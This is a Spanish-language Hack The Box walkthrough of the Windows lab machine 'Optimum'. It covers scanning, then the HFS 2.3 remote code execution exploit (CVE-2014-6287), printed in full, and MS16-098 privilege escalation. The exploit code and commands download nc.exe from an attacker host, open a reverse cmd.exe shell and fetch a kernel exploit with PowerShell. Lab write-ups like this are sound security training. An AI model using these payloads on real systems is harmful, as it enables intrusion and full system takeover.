---
layout: single
title: Optimum - Hack The Box
excerpt: "Optimum es una máquina Windows de dificultad fácil en la cual se va a explotar una vulnerabilidad en HTTP File Server 2.3 (CVE-2014-6287) que permite la ejecución de código remoto. Para la fase de escalamiento de privilegios, vamos a revisar qué parches aún no se han instalado en la máquina y de esta forma provecharnos de la vulnerabilidad MS16-098 (CVE-2016-3309) RGNOBJ Integer Overflow en Windows 8.1 x64 bit al abusar de objetos GDI."
date: 2020-06-20
classes: wide
header:
  teaser: /assets/images/hack-the-box/optimum-logo.png
  teaser_home_page: true
  icon: /assets/images/hack-the-box/hackthebox.webp
categories:
  - Hack-The-Box
  - Pentesting
tags:
  - HTTP File Server
  - MS16-098
---

<p align="center">
<img src="/assets/images/hack-the-box/optimum-logo.png">
</p>



Optimum es una máquina Windows de dificultad fácil en la cual se va a explotar una vulnerabilidad en HTTP File Server 2.3 (CVE-2014-6287) que permite la ejecución de código remoto. Para la fase de escalamiento de privilegios, vamos a revisar qué parches aún no se han instalado en la máquina y de esta forma provecharnos de la vulnerabilidad MS16-098 (CVE-2016-3309) RGNOBJ Integer Overflow en Windows 8.1 x64 bit al abusar de objetos GDI.


## Reconocimiento y Enumeración

### Ping

En primer lugar se debe revisar que la máquina esté activa. Hacemos un ping usando el siguiente comando:
`ping -c 4 optimum.htb`

- `-c <n>` = realizar *n* veces el ping

### Nmap

Se procede a realizar un escaneo de todos los puertos con la herramienta nmap usando el siguiente comando:
`nmap -p- --open -T5 -v -n optimum.htb -oG all-ports`

- `-p-:` escanea todos los 65536 puertos
- `--open:` solo se va a tener en cuenta los puertos abiertos
- `-T5:` establece la plantilla de temporización, el rango es entre 0-5 y por lo tanto, el escaneo va a ir a una mayor velocidad
- `-v:` cuando nmap descubre un puerto, lo imprime por consola
- `-n:` se desactiva la resolución de DNS
- `-oG:` el archivo se va a guardar en formato grepable 

El output de nmap es el siguiente:

```bash
┌─[root@parrot]─[/home/nicolasmira101/Documents/Hack-the-box/Maquinas/Optimum]
└──╼ #nmap -p- --open -T5 -n -v optimum.htb -oG all-ports
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-29 11:53 EDT

PORT      STATE SERVICE
80/tcp open  http
```

Una vez se sabe qué puertos están abiertos en la máquina objetivo se procede a revisar las versiones de los servicios usando el comando:
`nmap -sC -sV -p80 optimum.htb -oN targeted.txt`

- `-sC:`  realiza un escaneo usando los scripts por defecto que se encuentran en la base de datos de nmap.
- `-sV:` intenta encontrar la versión del servicio que está corriendo en el puerto correspondiente.
- `-p:` se establece los puertos que deseo hacer el escaneo.
- `oN:` el archivo se va a guardar en un formato normal, en este caso en formato de texto.

El output de nmap es el siguiente:

```bash
┌─[root@parrot]─[/home/nicolasmira101/Documents/Hack-the-box/Maquinas/Optimum]
└──╼ #nmap -sC -sV -p80 optimum.htb -oN targeted
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-29 13:36 -05
Stats: 0:00:08 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 0.00% done
Nmap scan report for optimum.htb (10.10.10.8)
Host is up (0.085s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

El puerto que se encuentra abierto corresponde al siguientes servicio:

- `Puerto 80 (HTTP):` se utiliza para la navegación web de forma no segura.

### Enumeración HTTP

Como se pudo observar en el output de Nmap, encontramos que tiene un servidor web `HTTP File Server (HFS)` que está diseñado específicamente para publicar y compartir archivos. La versión de este servicio es la `2.3`. 




## Explotación

Buscamos en `Exploit-db` si hay un exploit asociado a esta versión y encontramos el siguiente [exploit](https://www.exploit-db.com/exploits/39161).

```python
#!/usr/bin/python
# Description: You can use HFS (HTTP File Server) to send and receive files.
#	       It's different from classic file sharing because it uses web technology to be more compatible with today's Internet.
#	       It also differs from classic web servers because it's very easy to use and runs "right out-of-the box". Access your remote files, over the network. It has been successfully tested with Wine under Linux. 
 
#Usage : python Exploit.py <Target IP address> <Target Port Number>

#EDB Note: You need to be using a web server hosting netcat (http://<attackers_ip>:80/nc.exe).  
#          You may need to run it multiple times for success!


import urllib2
import sys

try:
	def script_create():
		urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+save+".}")

	def execute_script():
		urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+exe+".}")

	def nc_run():
		urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+exe1+".}")

	ip_addr = "192.168.44.128" #local IP address
	local_port = "443" # Local Port number
	vbs = "C:\Users\Public\script.vbs|dim%20xHttp%3A%20Set%20xHttp%20%3D%20createobject(%22Microsoft.XMLHTTP%22)%0D%0Adim%20bStrm%3A%20Set%20bStrm%20%3D%20createobject(%22Adodb.Stream%22)%0D%0AxHttp.Open%20%22GET%22%2C%20%22http%3A%2F%2F"+ip_addr+"%2Fnc.exe%22%2C%20False%0D%0AxHttp.Send%0D%0A%0D%0Awith%20bStrm%0D%0A%20%20%20%20.type%20%3D%201%20%27%2F%2Fbinary%0D%0A%20%20%20%20.open%0D%0A%20%20%20%20.write%20xHttp.responseBody%0D%0A%20%20%20%20.savetofile%20%22C%3A%5CUsers%5CPublic%5Cnc.exe%22%2C%202%20%27%2F%2Foverwrite%0D%0Aend%20with"
	save= "save|" + vbs
	vbs2 = "cscript.exe%20C%3A%5CUsers%5CPublic%5Cscript.vbs"
	exe= "exec|"+vbs2
	vbs3 = "C%3A%5CUsers%5CPublic%5Cnc.exe%20-e%20cmd.exe%20"+ip_addr+"%20"+local_port
	exe1= "exec|"+vbs3
	script_create()
	execute_script()
	nc_run()
except:
	print """[.]Something went wrong..!
	Usage is :[.] python exploit.py <Target IP address>  <Target Port Number>
	Don't forgot to change the Local IP address and Port number on the script"""
```

Antes de ejecutar el script, lo primero que debemos hacer es alojar un servidor web en nuestra máquina para enviar el binario de `nc.exe` a la máquina del objetivo y de esta forma tener una shell. Para esto vamos a usar Python.

```bash
┌─[root@parrot]─[/home/nicolasmira101/Documents/Hack-the-box/Maquinas/Optimum]
└──╼ #python3 -m http.server 80                                                                         
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Ahora, vamos a descargar el archivo `nc.exe` en el siguiente [link](https://eternallybored.org/misc/netcat/) y procedemos a iniciar una sesión en netcat en nuestra máquina.

```bash
┌─[root@parrot]─[/home/nicolasmira101/Documents/Hack-the-box/Maquinas/Optimum]
└──╼ #rlwrap nc -nlvp 443                                                                               
listening on [any] 443 ...
```
Para ejecutar el script correctamente debemos cambiar las siguientes variables

```python
ip_addr = "10.10.14.15" # Dirección IP de la máquina del atacante

local_port = "443" # Puerto que hayamos establecido anteriormente en el listener de nc
```

Procedemos a ejecutar el script de la siguiente manera. Cabe aclarar que se debe ejecutar 2 veces, ya que en la primera se carga el binario `nc.exe` y en la segunda vez sí nos entabla la shell.

```bash
┌─[root@parrot]─[/home/nicolasmira101/Documents/Hack-the-box/Maquinas/Optimum]
└──╼ #python exploit.py 10.10.10.8 80

┌─[root@parrot]─[/home/nicolasmira101/Documents/Hack-the-box/Maquinas/Optimum]
└──╼ #python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.8 - - [29/Jun/2020 13:51:24] "GET /nc.exe HTTP/1.1" 200 -

┌─[root@parrot]─[/home/nicolasmira101/Documents/Hack-the-box/Maquinas/Optimum]
└──╼ #python exploit.py 10.10.10.8 80

┌─[root@parrot]─[/home/nicolasmira101/Documents/Hack-the-box/Maquinas/Optimum]
└──╼ #rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.10.8] 49162
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.                                                    
C:\Users\kostas\Desktop>whoami
whoami
optimum\kostas                                                                                          
C:\Users\kostas\Desktop>type user.txt.txt
type user.txt.txt                                   
d0c394.............................
```



## Escalamiento de privilegios

Vamos a utilizar la herramienta [Windows Exploit Suggester ](https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git) que compara los niveles de parches de objetivos con la base de datos de vulnerabilidades de Microsoft para detectar posibles parches faltantes en el objetivo.

```bash
┌─[root@parrot]─[/opt]
└──╼ #git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git

Cloning into 'Windows-Exploit-Suggester'...
remote: Enumerating objects: 120, done.
remote: Total 120 (delta 0), reused 0 (delta 0), pack-reused 120
Receiving objects: 100% (120/120), 169.26 KiB | 3.02 MiB/s, done.
Resolving deltas: 100% (72/72), done.
```

Debemos instalar las dependencias que requiere esta herramienta y luego actualizar la base de datos 

```bash
┌─[root@parrot]─[/opt/wesng]
└──╼ #./windows-exploit-suggester.py --update
[*] initiating...
[*] successfully requested base url
[*] scraped ms download url
[+] writing to file 2020-06-29-mssb.xlsx
[*] done
```

Como nos dice la documentación de la herramienta, se requiere el output del comando `systeminfo` , que es un comando de la línea de comandos en Windows, que permite buscar información básica de configuración del sistema. Se requiere el output de este comando para que `wesng` puede comparar la base de datos del boletín de seguridad de Microsoft y determinar el nivel de parche del host.

```bash
C:\Users\kostas\Desktop>systeminfo
systeminfo                                                                           

Host Name:                 OPTIMUM                  
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:                            
Product ID:                00252-70000-00000-AA535
Original Install Date:     18/3/2017, 1:51:36
System Boot Time:          6/7/2020, 6:31:10
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows               
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek                 
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest
Total Physical Memory:     4.095 MB                 
Available Physical Memory: 3.485 MB                 
Virtual Memory: Max Size:  5.503 MB
Virtual Memory: Available: 4.687 MB
Virtual Memory: In Use:    816 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              \\OPTIMUM                
Hotfix(s):                 31 Hotfix(s) Installed.
                           [01]: KB2959936
                           [02]: KB2896496
                           [03]: KB2919355
                           [04]: KB2920189
                           [05]: KB2928120
                           [06]: KB2931358
                           [07]: KB2931366
                           [08]: KB2933826
                           [09]: KB2938772
                           [10]: KB2949621
                           [11]: KB2954879
                           [12]: KB2958262
                           [13]: KB2958263
                           [14]: KB2961072
                           [15]: KB2965500
                           [16]: KB2966407
                           [17]: KB2967917
                           [18]: KB2971203
                           [19]: KB2971850
                           [20]: KB2973351
                           [21]: KB2973448
                           [22]: KB2975061
                           [23]: KB2976627
                           [24]: KB2977629
                           [25]: KB2981580
                           [26]: KB2987107
                           [27]: KB2989647
                           [28]: KB2998527
                           [29]: KB3000850
                           [30]: KB3003057
                           [31]: KB3014442
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) 82574L Gigabit Network Connection
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.8
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be dis
played.
```

Copiamos el output anterior y lo guardamos en un archivo `.txt` y ejecutamos el siguiente comando de la herramienta `Windows-Exploit-Suggester`

```console
┌─[root@parrot]─[/opt/Windows-Exploit-Suggester]
└──╼ #./windows-exploit-suggester.py --database 2020-06-29-mssb.xlsx --systeminfo systeminfo.txt 
[*] initiating...
[*] database file detected as xls or xlsx based on extension
[*] reading from the systeminfo input file
[*] querying database file for potential vulnerabilities
[*] comparing the 32 hotfix(es) against the 266 potential bulletins(s)
[*] there are now 246 remaining vulns
[+] windows version identified as 'Windows 2012 R2 64-bit'
[*] 
[E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important
[*] https://www.exploit-db.com/exploits/41020 -- Microsoft Windows 8.1 (x64) - 'RGNOBJ' Integer Overflow (MS16-098)
[*]
```

De las vulnerabilidades que más nos llama la atención es la `MS16-098` donde los controladores en modo Kernel en Microsoft Windows Server 2012 R2, permite a los usuarios locales obtener privilegios. Para más información leer este [boletín](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-098#vulnerability-information) oficial de Microsoft.

En `Exploit-db` encontramos el siguiente [exploit](https://www.exploit-db.com/exploits/41020), así que vamos a descargar este archivo y al igual que hicimos con el exploit de `HFS` vamos a crear un servidor web con Python y transferirlo a la máquina de la víctima, en este caso, usando `Powershell`.

```bash
┌─[root@parrot]─[/home/nicolasmira101/Documents/Hack-the-box/Maquinas/Optimum]
└──╼ #ls
all-ports  exploit.py  nc.exe  systeminfo.txt  targeted  41020.exe

┌─[root@parrot]─[/home/nicolasmira101/Documents/Hack-the-box/Maquinas/Optimum]
└──╼ #python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:80/) ...
```

```bash
C:\Users\kostas\Desktop>powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.15:8080/41020.exe', 'c:\Users\kostas\Desktop\41020.exe')"
```

Finalmente, ejecutamos el exploit y ya seremos administradores, así que vamos a buscar la flag de root.

```bash
C:\Users\kostas\Desktop> 41020.exe
41020.exe
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.                                                    
C:\Users\kostas\Desktop>whoami
whoami
nt authority\system                                                                                          
C:\Users\kostas\Desktop>type C:\Users\Administrator\Desktop\root.txt
type root.txt                                  
5949b3.............................
```



## Resumen

Para obtener la bandera del usuario realizamos los siguientes pasos:

- Con el escaneo de puertos, encontramos que se está ejecutando HTTP File Server 2.3.
- Procedemos a buscar vulnerabilidades en esta versión específica del servidor web.
- Descargamos el script en Python que se encuentra en Exploit-db.
- Cambiamos las variables `ip_addr` y `local_port` de acuerdo a la IP de nuestra máquina y el puerto que establezcamos en netcat.
- Iniciamos un servidor http usando Python.
- Creamos un listener con netcat en el puerto que hayamos establecido en el código del exploit.
- Ejecutamos el exploit 2 veces y ya tenemos shell.

Para obtener la bandera del administramos realizamos los siguientes pasos:

- Guardamos el output del comando `systeminfo`
- Usamos `Windows Exploit Suggester` para revisar si hay alguna vulnerabilidad no parchada, siguiendo al pie de la letra lo que nos dice la documentación.
- Encontramos que hay una vulnerabilidad MS16-098, así que procedemos a descargar el script que se encuentra en `Exploit-db`.
- Al igual que hicimos en la fase del usuario, vamos a crear un servidor web con Python y enviamos este exploit a la máquina objetivo.
- Finalmente ejecutamos el exploit y ya tendremos la flag de administrador.